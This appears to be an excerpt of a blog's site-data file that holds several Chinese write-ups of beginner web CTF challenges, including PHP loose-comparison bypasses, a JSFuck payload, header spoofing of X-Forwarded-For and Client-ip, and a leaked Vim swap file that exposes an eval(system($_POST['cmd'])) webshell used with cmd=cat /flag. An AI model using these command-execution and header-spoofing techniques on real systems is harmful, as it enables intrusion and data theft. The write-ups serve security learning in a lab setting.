echo $flag2;\n}\n?>\n\nCyberpeace{647E37C7627CC3E4019EC69324F66C7C}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第11题\n\n\n\n * 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n * 考点1：php基础\n * 思路1：\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称         题目方向   难度\ngfsj0485   simple_php   web    1\n\n\n# 题目11： simple_php\n\n\n# 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n\n\n# 考点1：php基础\n\n\n# 思路1：\n\n\ufeff<?php\n# 这里这行代码是显示源代码的意思，一般的php的普通渲染是不会显示出来的\nshow_source(__file__);\n# config.pip文件应该是配置项之类的\ninclude(\"config.php\");\n# 定义两个变量，需要我们在请求的时候传入a和b\n$a=@$_get['a'];\n$b=@$_get['b'];\n# if判断，如果a弱等于0，并且a不能为0的话，就输出flag1\nif($a==0 and $a){\n    echo $flag1;\n}\n# if判断，b不能为数字，如果为数字就退出\nif(is_numeric($b)){\n    exit();\n}\n# if判断，b必须大于1234\nif($b>1234){\n    echo $flag2;\n}\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在传入一个参数a的时候，对照php 类型比较表 - manual，如果php的版本低于8.0.0，只要a传入一个字符串，就能符合条件。而下一个判断是判断b是否是一个数字，我们可以传入一个字符串，用数字拼接字符串的方式，就能符合不是数字的条件，进入下一个判断。第三个判断是比较b和1234，我们只要输入一个比1234大的数字拼接一个字符串，即可符合条件\n\n\n\n我们直接在地址栏输入地址加参数a=a，即可得到flag1，也就是flag的前部部分，输入b=1235a，即可得到flag\n\nhttp://61.147.171.105:59590/?a=a&b=1235a\n\n<?php\nshow_source(__file__);\ninclude(\"config.php\");\n# 将我们输入的字符串a传给了$a，在进行弱比较时，是false*，并且传入了a，a所以不是0，符合条件\n$a=@$_get['a'];\n$b=@$_get['b'];\nif($a==0 and $a){\n    echo $flag1;\n}\n# 如果我们输入数字12345，这里会直接退出\nif(is_numeric($b)){\n    exit();\n}\n/* \n这里是一个松散比较，我们传入一个字符串123a，就能绕过上个判断，来到这里的判断，所以我们传入1235a\n传入1235a后，会比较1235和1234，与a没有关系\n*/\nif($b>1234){\n    echo $flag2;\n}\n?>\n\ncyberpeace{647e37c7627cc3e4019ec69324f66c7c}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3863",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3863",date:"2024-11-24T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-24-1-CTF-3863-WriteUp.html",relativePath:"views/essay/2024-11-24-1-CTF-3863-WriteUp.md",key:"v-95418998",path:"/views/essay/2024-11-24-1-CTF-3863-WriteUp.html",headers:[{level:3,title:"题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~Flag形式 NSSCTF{}",slug:"题目描述-你是一颗导弹-你需要-飞到最后-通过6道关卡就能拿到flag哦-flag形式-nssctf",normalizedTitle:"题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~flag形式 nssctf{}",charIndex:42},{level:3,title:"考点1：JavaScript基础",slug:"考点1-javascript基础",normalizedTitle:"考点1：javascript基础",charIndex:99},{level:3,title:"思路1：完成游戏目标",slug:"思路1-完成游戏目标",normalizedTitle:"思路1：完成游戏目标",charIndex:119},{level:3,title:"思路2：检查js文件",slug:"思路2-检查js文件",normalizedTitle:"思路2：检查js文件",charIndex:133}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第14题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3863</td>\n<td>导弹迷踪</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~Flag形式 NSSCTF{} 考点1：JavaScript基础 思路1：完成游戏目标 思路2：检查js文件",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第14题\n\n\n\n * 题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~Flag形式 NSSCTF{}\n * 考点1：JavaScript基础\n * 思路1：完成游戏目标\n * 思路2：检查js文件\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3863   导弹迷踪   Web    1\n\n\n# 题目14： 导弹迷踪\n\n\n# 题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~Flag形式 NSSCTF{}\n\n\n# 考点1：JavaScript基础\n\n\n# 思路1：完成游戏目标\n\n进入页面后发现是一道常规游戏题，需要我们打到Level6，就能拿到Flag，针对这种基于js开发的小游戏，我们一种方法是按照题目要求达到目标，另一种方法就是检查js文件\n\n\n# 思路2：检查js文件\n\n这种比较基础的题目的话，一般检查js文件即可，我们按F12打开开发者工具，切换到Sources，在目录下打卡js的文件夹，用快捷键Ctrl+Shift+F全局搜索，首先我们查找Flag，没找到想要的flag。\n\n\n\n仔细查看题目描述，我们需要打到Level6就能显示Flag，那说明代码里一定有判断Level==6的语句，我们尝试搜索Level，找到如下内容\n\n",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第14题\n\n\n\n * 题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~flag形式 nssctf{}\n * 考点1：javascript基础\n * 思路1：完成游戏目标\n * 思路2：检查js文件\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3863   导弹迷踪   web    1\n\n\n# 题目14： 导弹迷踪\n\n\n# 题目描述：你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~flag形式 nssctf{}\n\n\n# 考点1：javascript基础\n\n\n# 思路1：完成游戏目标\n\n进入页面后发现是一道常规游戏题，需要我们打到level6，就能拿到flag，针对这种基于js开发的小游戏，我们一种方法是按照题目要求达到目标，另一种方法就是检查js文件\n\n\n# 思路2：检查js文件\n\n这种比较基础的题目的话，一般检查js文件即可，我们按f12打开开发者工具，切换到sources，在目录下打卡js的文件夹，用快捷键ctrl+shift+f全局搜索，首先我们查找flag，没找到想要的flag。\n\n\n\n仔细查看题目描述，我们需要打到level6就能显示flag，那说明代码里一定有判断level==6的语句，我们尝试搜索level，找到如下内容\n\n",charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3871",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3871",date:"2024-11-24T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-24-2-CTF-3871-WriteUp.html",relativePath:"views/essay/2024-11-24-2-CTF-3871-WriteUp.md",key:"v-16b6d9b4",path:"/views/essay/2024-11-24-2-CTF-3871-WriteUp.html",headers:[{level:3,title:"题目描述：js…?不确定，再看看。Flag形式 NSSCTF{}",slug:"题目描述-js-不确定-再看看。flag形式-nssctf",normalizedTitle:"题目描述：js…?不确定，再看看。flag形式 nssctf{}",charIndex:42},{level:3,title:"考点1：JavaScript基础",slug:"考点1-javascript基础",normalizedTitle:"考点1：javascript基础",charIndex:78},{level:3,title:"预期解：通过执行JSfuck得到Flag",slug:"预期解-通过执行jsfuck得到flag",normalizedTitle:"预期解：通过执行jsfuck得到flag",charIndex:98},{level:3,title:"基本原理",slug:"基本原理",normalizedTitle:"基本原理",charIndex:122},{level:3,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:130},{level:3,title:"思路2：通过package.json文件找到对应的Git仓库，对比发现",slug:"思路2-通过package-json文件找到对应的git仓库-对比发现",normalizedTitle:"思路2：通过package.json文件找到对应的git仓库，对比发现",charIndex:138}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第15题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3871</td>\n<td>1zjs</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：js…?不确定，再看看。Flag形式 NSSCTF{} 考点1：JavaScript基础 预期解：通过执行JSfuck得到Flag 基本原理 使用场景 思路2：通过package.json文件找到对应的Git仓库，对比发现",content:'[LitCTF 2023]这套题是Web方向入门题单，这是我的第15题\n\n\n\n * 题目描述：js…?不确定，再看看。Flag形式 NSSCTF{}\n * 考点1：JavaScript基础\n * 预期解：通过执行JSfuck得到Flag\n * 基本原理\n * 使用场景\n * 思路2：通过package.json文件找到对应的Git仓库，对比发现\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3871   1zjs   Web    1\n\n\n# 题目15： 1zjs\n\n\n# 题目描述：js…?不确定，再看看。Flag形式 NSSCTF{}\n\n\n# 考点1：JavaScript基础\n\n\n# 预期解：通过执行JSfuck得到Flag\n\n根据题目描述，我们查看js代码内容，没找到想要的目标。通过查阅主办方WP得到以下方法：\n\n上来先审查元素，看到有引入了一个index.umd.js的文件\n\n<script src="./dist/index.umd.js"><\/script>\n\n\n1\n\n\n点击前往该文件，我们看到有文件开头有一大片的注释信息，一般情况下是把目标放到注释里的，看到这里有个名为/f@k3f1ag.php文件\n\n\n\n在浏览器地址栏访问该文件，我们看到如下信息\n\n\n\n这段信息叫JSfuck，我们将其复制出来，在F12的Console控制台粘贴该内容，返回了一个Warning的警告，意思需要输入allow pasting，打开粘贴功能。执行该JSfuck命令后，即可拿到Flag。\n\n\n\n> ‌JSFuck‌是一种基于JavaScript的编程风格，它使用六个不同的字符（[ ] ( ) + [ ] !）来编写和执行代码。这种编程风格源于Brainfuck，但仅使用六种符号，而不是Brainfuck的八种符号。JSFuck不依赖于特定的浏览器环境，甚至可以在Node.js中运行‌12。\n> \n> \n> # 基本原理\n> \n> JSFuck的基本思想是通过这些六个字符的组合来模拟JavaScript的语法和行为。例如：\n> \n>  * []：定义一个数组\n>  * ()：定义一个函数\n>  * +：进行加法操作\n>  * !：逻辑非操作\n> \n> 通过这些基本操作，可以构建出复杂的JavaScript代码结构‌。\n> \n> \n> # 使用场景\n> \n> JSFuck不仅可以用作一种编程练习或教学工具，由于其代码难以阅读和理解的特性，它还可以用于代码混淆和绕过某些安全检测。例如，在跨站点脚本（XSS）攻击中，通过使用JSFuck编码的代码可以绕过一些简单的过滤机制，增加攻击的成功率‌。\n\n\n# 思路2：通过package.json文件找到对应的Git仓库，对比发现\n\n由Tao/.师傅提供思路\n\n访问路径下的package.json文件，看到有仓库的信息，对比index.html文件，找到index.umd.js，后续操作和思路1相同\n\n',normalizedContent:'[litctf 2023]这套题是web方向入门题单，这是我的第15题\n\n\n\n * 题目描述：js…?不确定，再看看。flag形式 nssctf{}\n * 考点1：javascript基础\n * 预期解：通过执行jsfuck得到flag\n * 基本原理\n * 使用场景\n * 思路2：通过package.json文件找到对应的git仓库，对比发现\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3871   1zjs   web    1\n\n\n# 题目15： 1zjs\n\n\n# 题目描述：js…?不确定，再看看。flag形式 nssctf{}\n\n\n# 考点1：javascript基础\n\n\n# 预期解：通过执行jsfuck得到flag\n\n根据题目描述，我们查看js代码内容，没找到想要的目标。通过查阅主办方wp得到以下方法：\n\n上来先审查元素，看到有引入了一个index.umd.js的文件\n\n<script src="./dist/index.umd.js"><\/script>\n\n\n1\n\n\n点击前往该文件，我们看到有文件开头有一大片的注释信息，一般情况下是把目标放到注释里的，看到这里有个名为/f@k3f1ag.php文件\n\n\n\n在浏览器地址栏访问该文件，我们看到如下信息\n\n\n\n这段信息叫jsfuck，我们将其复制出来，在f12的console控制台粘贴该内容，返回了一个warning的警告，意思需要输入allow pasting，打开粘贴功能。执行该jsfuck命令后，即可拿到flag。\n\n\n\n> ‌jsfuck‌是一种基于javascript的编程风格，它使用六个不同的字符（[ ] ( ) + [ ] !）来编写和执行代码。这种编程风格源于brainfuck，但仅使用六种符号，而不是brainfuck的八种符号。jsfuck不依赖于特定的浏览器环境，甚至可以在node.js中运行‌12。\n> \n> \n> # 基本原理\n> \n> jsfuck的基本思想是通过这些六个字符的组合来模拟javascript的语法和行为。例如：\n> \n>  * []：定义一个数组\n>  * ()：定义一个函数\n>  * +：进行加法操作\n>  * !：逻辑非操作\n> \n> 通过这些基本操作，可以构建出复杂的javascript代码结构‌。\n> \n> \n> # 使用场景\n> \n> jsfuck不仅可以用作一种编程练习或教学工具，由于其代码难以阅读和理解的特性，它还可以用于代码混淆和绕过某些安全检测。例如，在跨站点脚本（xss）攻击中，通过使用jsfuck编码的代码可以绕过一些简单的过滤机制，增加攻击的成功率‌。\n\n\n# 思路2：通过package.json文件找到对应的git仓库，对比发现\n\n由tao/.师傅提供思路\n\n访问路径下的package.json文件，看到有仓库的信息，对比index.html文件，找到index.umd.js，后续操作和思路1相同\n\n',charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3865",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3865",date:"2024-11-24T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-24-3-CTF-3865-WriteUp.html",relativePath:"views/essay/2024-11-24-3-CTF-3865-WriteUp.md",key:"v-67c59334",path:"/views/essay/2024-11-24-3-CTF-3865-WriteUp.html",headers:[{level:3,title:"题目描述：探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）",slug:"题目描述-探姬坚信php是世界上最好的语言-于是她用php写了一个小工具-flag位于根目录",normalizedTitle:"题目描述：探姬坚信php是世界上最好的语言，于是她用php写了一个小工具 （flag位于根目录）",charIndex:42},{level:3,title:"考点1：PHP基础",slug:"考点1-php基础",normalizedTitle:"考点1：php基础",charIndex:94},{level:3,title:"预期解：通过PHP显示Flag文件内容",slug:"预期解-通过php显示flag文件内容",normalizedTitle:"预期解：通过php显示flag文件内容",charIndex:107},{level:3,title:"注：该题目因为环境原因，我在点击Run  Code时没有反应",slug:"注-该题目因为环境原因-我在点击run-code时没有反应",normalizedTitle:"注：该题目因为环境原因，我在点击run  code时没有反应",charIndex:null}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第16题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3865</td>\n<td>PHP是世界上最好的语言！！</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录） 考点1：PHP基础 预期解：通过PHP显示Flag文件内容 注：该题目因为环境原因，我在点击Run  Code时没有反应",content:'[LitCTF 2023]这套题是Web方向入门题单，这是我的第16题\n\n\n\n * 题目描述：探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）\n * 考点1：PHP基础\n * 预期解：通过PHP显示Flag文件内容\n * 注：该题目因为环境原因，我在点击Run Code时没有反应\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称             题目方向   难度\n3865   PHP是世界上最好的语言！！   Web    1\n\n\n# 题目16： PHP是世界上最好的语言！！\n\n\n# 题目描述：探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）\n\n\n# 考点1：PHP基础\n\n\n# 预期解：通过PHP显示Flag文件内容\n\n打开页面，发现右半部分是一个PHP编译器，我们输入system("cat /falg");查看Flag内容\n\n\n\nsystem("cat /falg");\n\n\n1\n\n\n主办方提供的WP是通过以上命令，即可抓取题目描述中根目录中的flag。\n\n但发现NSS里这套题单是复现出来的，和当时主办方举办比赛时的环境不同，用主办方提供的方法不能拿到Flag，故又参考了其他师傅的WP，有师傅用\n\n# 先使用了如下命令\n<?php system(‘cat /flag’); ?>\n# 发现在执行时报错，把/flag识别成了字符串，所以使用了如下命令\n<?php system(“cat /flag”); ?>\n\n\n1\n2\n3\n4\n\n\n得到flag：NSSCTF{c5d924a1-e829-40c2-b8e6-e3d92504f8cb}\n\n\n# 注：该题目因为环境原因，我在点击Run Code时没有反应\n\n我尝试使用手机浏览器，在输入对应代码后有了返回，最后才提交Flag',normalizedContent:'[litctf 2023]这套题是web方向入门题单，这是我的第16题\n\n\n\n * 题目描述：探姬坚信php是世界上最好的语言，于是她用php写了一个小工具 （flag位于根目录）\n * 考点1：php基础\n * 预期解：通过php显示flag文件内容\n * 注：该题目因为环境原因，我在点击run code时没有反应\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称             题目方向   难度\n3865   php是世界上最好的语言！！   web    1\n\n\n# 题目16： php是世界上最好的语言！！\n\n\n# 题目描述：探姬坚信php是世界上最好的语言，于是她用php写了一个小工具 （flag位于根目录）\n\n\n# 考点1：php基础\n\n\n# 预期解：通过php显示flag文件内容\n\n打开页面，发现右半部分是一个php编译器，我们输入system("cat /falg");查看flag内容\n\n\n\nsystem("cat /falg");\n\n\n1\n\n\n主办方提供的wp是通过以上命令，即可抓取题目描述中根目录中的flag。\n\n但发现nss里这套题单是复现出来的，和当时主办方举办比赛时的环境不同，用主办方提供的方法不能拿到flag，故又参考了其他师傅的wp，有师傅用\n\n# 先使用了如下命令\n<?php system(‘cat /flag’); ?>\n# 发现在执行时报错，把/flag识别成了字符串，所以使用了如下命令\n<?php system(“cat /flag”); ?>\n\n\n1\n2\n3\n4\n\n\n得到flag：nssctf{c5d924a1-e829-40c2-b8e6-e3d92504f8cb}\n\n\n# 注：该题目因为环境原因，我在点击run code时没有反应\n\n我尝试使用手机浏览器，在输入对应代码后有了返回，最后才提交flag',charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3869",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3869",date:"2024-11-28T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-28-1-CTF-3869-WtriteUp.html",relativePath:"views/essay/2024-11-28-1-CTF-3869-WtriteUp.md",key:"v-84b552f4",path:"/views/essay/2024-11-28-1-CTF-3869-WtriteUp.html",headers:[{level:3,title:"题目描述：怎么还有一层…",slug:"题目描述-怎么还有一层",normalizedTitle:"题目描述：怎么还有一层…",charIndex:42},{level:3,title:"考点：HTTP协议Request的Header请求头",slug:"考点-http协议request的header请求头",normalizedTitle:"考点：http协议request的header请求头",charIndex:58},{level:3,title:"预期解：",slug:"预期解",normalizedTitle:"预期解：",charIndex:88}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第20题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3869</td>\n<td>Http pro max plus</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：怎么还有一层… 考点：HTTP协议Request的Header请求头 预期解：",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第20题\n\n\n\n * 题目描述：怎么还有一层…\n * 考点：HTTP协议Request的Header请求头\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称                题目方向   难度\n3869   Http pro max plus   Web    1\n\n\n# 题目20：Http pro max plus\n\n\n# 题目描述：怎么还有一层…\n\n\n# 考点：HTTP协议Request的Header请求头\n\n\n# 预期解：\n\n我们进入靶机，看到页面中的提示，只允许本地访问，我们最常用的请求头是X-Forwarded-For，我们点击MODIFY HEADER，添加该请求头。\n\n\n\n发送请求后，得到如下结果，我们换一种方式，用Client-ip来伪造本地请求\n\n\n\n点击EXECUTE发送请求后，得到如下返回，添加一个请求头Referer\n\n\n\n点击EXECUTE发送请求后，得到如下返回，添加一个请求头User-Agent\n\n\n\n点击EXECUTE发送请求后，得到如下返回，添加一个请求头via\n\n\n\n点击EXECUTE发送请求后，得到如下返回，然后我们访问这个文件\n\n\n\n特别要注意的是不要进入他的陷阱，要照老规矩审查元素\n\n\n\n最后访问/sejishikong.php文件，得到Flag\n\n\n\n> 这道题主要考察的是HTTP协议的请求头，可以查阅资料学习请求头的基本类型【传送门】",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第20题\n\n\n\n * 题目描述：怎么还有一层…\n * 考点：http协议request的header请求头\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称                题目方向   难度\n3869   http pro max plus   web    1\n\n\n# 题目20：http pro max plus\n\n\n# 题目描述：怎么还有一层…\n\n\n# 考点：http协议request的header请求头\n\n\n# 预期解：\n\n我们进入靶机，看到页面中的提示，只允许本地访问，我们最常用的请求头是x-forwarded-for，我们点击modify header，添加该请求头。\n\n\n\n发送请求后，得到如下结果，我们换一种方式，用client-ip来伪造本地请求\n\n\n\n点击execute发送请求后，得到如下返回，添加一个请求头referer\n\n\n\n点击execute发送请求后，得到如下返回，添加一个请求头user-agent\n\n\n\n点击execute发送请求后，得到如下返回，添加一个请求头via\n\n\n\n点击execute发送请求后，得到如下返回，然后我们访问这个文件\n\n\n\n特别要注意的是不要进入他的陷阱，要照老规矩审查元素\n\n\n\n最后访问/sejishikong.php文件，得到flag\n\n\n\n> 这道题主要考察的是http协议的请求头，可以查阅资料学习请求头的基本类型【传送门】",charsets:{cjk:!0},lastUpdated:"2024/11/28, 20:38:58",lastUpdatedTimestamp:1732797538e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3866",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3866",date:"2024-11-26T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-26-1-CTF-3866-WriteUp.html",relativePath:"views/essay/2024-11-26-1-CTF-3866-WriteUp.md",key:"v-073b5994",path:"/views/essay/2024-11-26-1-CTF-3866-WriteUp.html",headers:[{level:3,title:"题目描述：漏…漏了！",slug:"题目描述-漏-漏了",normalizedTitle:"题目描述：漏…漏了！",charIndex:42},{level:3,title:"考点1：信息泄露",slug:"考点1-信息泄露",normalizedTitle:"考点1：信息泄露",charIndex:56},{level:3,title:"考点2：Linux常用命令",slug:"考点2-linux常用命令",normalizedTitle:"考点2：linux常用命令",charIndex:68},{level:3,title:"预期解：",slug:"预期解",normalizedTitle:"预期解：",charIndex:85}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第18题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3866</td>\n<td>Vim yyds</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：漏…漏了！ 考点1：信息泄露 考点2：Linux常用命令 预期解：",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第18题\n\n\n\n * 题目描述：漏…漏了！\n * 考点1：信息泄露\n * 考点2：Linux常用命令\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称       题目方向   难度\n3866   Vim yyds   Web    1\n\n\n# 题目18：Vim yyds\n\n\n# 题目描述：漏…漏了！\n\n\n# 考点1：信息泄露\n\n\n# 考点2：Linux常用命令\n\n\n# 预期解：\n\n进入页面后，发现只有一个VIm的图标，结合题目描述，可以大致想到是Vim缓存文件泄露\n\n> Vim的备份文件后缀/Vim缓存文件后缀\n> \n> 使用 vim 时会创建临时缓存文件，关闭vim时缓存文件会被删除。如果vim 异常 退出，这时候未处理缓存文件，就会导致可以通过缓存文件查看文件内容。 第一次意外退出产生的备份文件名为：.filename.swp 第二次意外退出产生的备份文件名为：.filename.swo 第三次意外退出产生的备份文件名为：.filename.swn\n\n由此我们可以访问.index.php.swp，这个文件就是vim编辑后的缓存文件，在下载过后（有可能杀毒软件会弹窗），我们用010Editor或者其他编辑器打开，找到关键代码\n\n$password = \"Give_Me_Your_Flag\";\n$_POST['password'] === base64_encode($password)\neval(system($_POST['cmd']));\n\n\n1\n2\n3\n\n\n这段代码的意思是，我们用POST方法请求，并且传入一个名为“password”的参数，参数值必须为用base64加密过后的\"Give_Me_Your_Flag\"，这样才能触发后边的木马，也就是传入一个名为cmd的参数，这个参数值即为命令。\n\n我们打开HackBar，像该网站发送请求\n\n#地址\nhttp://node4.anna.nssctf.cn:28004/\n#参数\npassword=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat /flag\n\n\n1\n2\n3\n4\n\n\n",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第18题\n\n\n\n * 题目描述：漏…漏了！\n * 考点1：信息泄露\n * 考点2：linux常用命令\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称       题目方向   难度\n3866   vim yyds   web    1\n\n\n# 